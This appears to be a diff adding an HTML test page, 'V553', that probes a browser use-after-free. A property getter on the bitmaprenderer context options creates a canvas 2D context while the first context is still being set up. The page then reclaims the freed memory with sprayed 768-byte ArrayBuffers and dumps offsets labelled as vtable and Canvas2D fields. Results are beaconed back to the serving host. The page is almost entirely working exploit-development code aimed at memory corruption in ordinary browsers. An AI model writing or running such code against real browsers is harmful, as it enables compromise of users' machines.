@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V553</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V553-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+function hexdump(dv, off, len){
+  var s='';
+  for(var i=0;i<len;i++){
+    if(i>0&&i%16===0)s+=' ';
+    var v=dv.getUint8(off+i);
+    s+=(v<16?'0':'')+v.toString(16);
+  }
+  return s;
+}
+
+b('BOOT','V553-ab-identify');
+
+// T1: Baseline — AB(768) is zero-initialized
+(function T1(){
+  b('T1-START','baseline-zeroinit');
+  var ab=new ArrayBuffer(768);
+  var dv=new DataView(ab);
+  var allZero=true;
+  for(var i=0;i<768;i+=8){
+    if(dv.getFloat64(i)!==0){allZero=false;break}
+  }
+  b('T1-ZERO','allZero='+allZero);
+  dv.setUint32(0,0xDEADBEEF);
+  b('T1-WRITE','readback=0x'+dv.getUint32(0).toString(16));
+  b('T1-DONE','ok');
+})();
+
+// T2: UAF + single AB(768) — first alloc should reclaim the freed slot
+(function T2(){
+  b('T2-START','uaf-single-ab');
+  var ctx=triggerUAF();
+  b('T2-UAF','ctx='+(ctx?'ok':'null'));
+  var ab=new ArrayBuffer(768);
+  var dv=new DataView(ab);
+  // Read first 64 bytes — should be all zeros (AB zeroinit over freed Canvas2D)
+  b('T2-HEAD',hexdump(dv,0,64));
+  // Write marker at offset 0 (where vtable was)
+  dv.setFloat64(0,3.14159);
+  b('T2-WRITE','wrote pi at off0, readback='+dv.getFloat64(0));
+  b('T2-DONE','ok');
+})();
+
+// T3: UAF + single AB(768) + GC pressure — confirm GC doesn't corrupt AB data
+(function T3(){
+  b('T3-START','uaf-ab-gc');
+  var ctx=triggerUAF();
+  var ab=new ArrayBuffer(768);
+  var dv=new DataView(ab);
+  // Write markers at key offsets
+  dv.setUint32(0,0xAAAAAAAA);   // offset 0 (vtable low)
+  dv.setUint32(4,0xBBBBBBBB);   // offset 4 (vtable high)
+  dv.setUint32(592,0xCCCCCCCC); // m_unrealizedSaveCount offset (approx)
+  b('T3-PREG','markers written');
+  // Heavy GC pressure
+  var junk=[];
+  for(var g=0;g<20000;g++)junk.push({x:g,y:g*2});
+  junk=null;
+  for(var g=0;g<5000;g++){var t=new ArrayBuffer(1024);t=null}
+  b('T3-GC','pressure applied');
+  // Read markers back
+  b('T3-OFF0','0x'+dv.getUint32(0).toString(16)+dv.getUint32(4).toString(16));
+  b('T3-OFF592','0x'+dv.getUint32(592).toString(16));
+  var intact=(dv.getUint32(0)===0xAAAAAAAA && dv.getUint32(4)===0xBBBBBBBB && dv.getUint32(592)===0xCCCCCCCC);
+  b('T3-INTACT',String(intact));
+  b('T3-DONE','ok');
+})();
+
+// T4: UAF + 50 ABs — mark each, then check if any were modified by GC/wrapper interaction
+(function T4(){
+  b('T4-START','uaf-50ab-marks');
+  var ctx=triggerUAF();
+  var abs=[];
+  var dvs=[];
+  for(var i=0;i<50;i++){
+    var ab=new ArrayBuffer(768);
+    abs.push(ab);
+    var dv=new DataView(ab);
+    dvs.push(dv);
+    dv.setUint32(0,0x50000000|i); // unique marker at offset 0
+  }
+  b('T4-SPRAY','50 ABs marked');
+  // GC pressure
+  var junk=[];
+  for(var g=0;g<20000;g++)junk.push({x:g});
+  junk=null;
+  for(var g=0;g<5000;g++){var t=new ArrayBuffer(1024);t=null}
+  b('T4-GC','done');
+  // Check which ABs still have their markers
+  var modified=[];
+  for(var i=0;i<50;i++){
+    var v=dvs[i].getUint32(0);
+    var expected=0x50000000|i;
+    if(v!==expected){
+      modified.push(i+':0x'+v.toString(16));
+    }
+  }
+  b('T4-MOD',modified.length===0?'none':modified.join(','));
+  b('T4-DONE','ok');
+})();
+
+// T5: UAF + single AB(768) — write full 768B pattern, dump key offsets after GC
+(function T5(){
+  b('T5-START','full-pattern');
+  var ctx=triggerUAF();
+  var ab=new ArrayBuffer(768);
+  var dv=new DataView(ab);
+  // Fill entire AB with offset-based pattern: each uint32 = its byte offset
+  for(var i=0;i<768;i+=4){
+    dv.setUint32(i,i);
+  }
+  b('T5-FILL','768B pattern written');
+  // GC
+  var junk=[];
+  for(var g=0;g<10000;g++)junk.push({x:g});
+  junk=null;
+  for(var g=0;g<3000;g++){var t=new ArrayBuffer(1024);t=null}
+  b('T5-GC','done');
+  // Dump key offsets (likely Canvas2D field locations)
+  var offsets=[0,8,16,24,32,40,48,56,64,80,96,112,128,256,384,512,592,600,640,704,760];
+  var vals=[];
+  for(var j=0;j<offsets.length;j++){
+    var o=offsets[j];
+    vals.push(o+':'+dv.getUint32(o));
+  }
+  b('T5-DUMP',vals.join('|'));
+  // Check if ANY offset was modified
+  var corrupted=[];
+  for(var i=0;i<768;i+=4){
+    if(dv.getUint32(i)!==i){
+      corrupted.push(i+':0x'+dv.getUint32(i).toString(16));
+      if(corrupted.length>10)break;
+    }
+  }
+  b('T5-CORRUPT',corrupted.length===0?'NONE':corrupted.join(','));
+  b('T5-DONE','ok');
+})();
+
+// T6: Multiple UAFs — do second UAF's ABs land near first?
+(function T6(){
+  b('T6-START','double-uaf');
+  var ctx1=triggerUAF();
+  var ab1=new ArrayBuffer(768);
+  var dv1=new DataView(ab1);
+  dv1.setFloat64(0,1.1);
+  var ctx2=triggerUAF();
+  var ab2=new ArrayBuffer(768);
+  var dv2=new DataView(ab2);
+  dv2.setFloat64(0,2.2);
+  // Verify both are distinct
+  b('T6-AB1','val='+dv1.getFloat64(0));
+  b('T6-AB2','val='+dv2.getFloat64(0));
+  b('T6-DISTINCT',String(dv1.getFloat64(0)!==dv2.getFloat64(0)));
+  b('T6-DONE','ok');
+})();
+
+b('DONE','V553-all-complete');
+</script>
+</body></html>
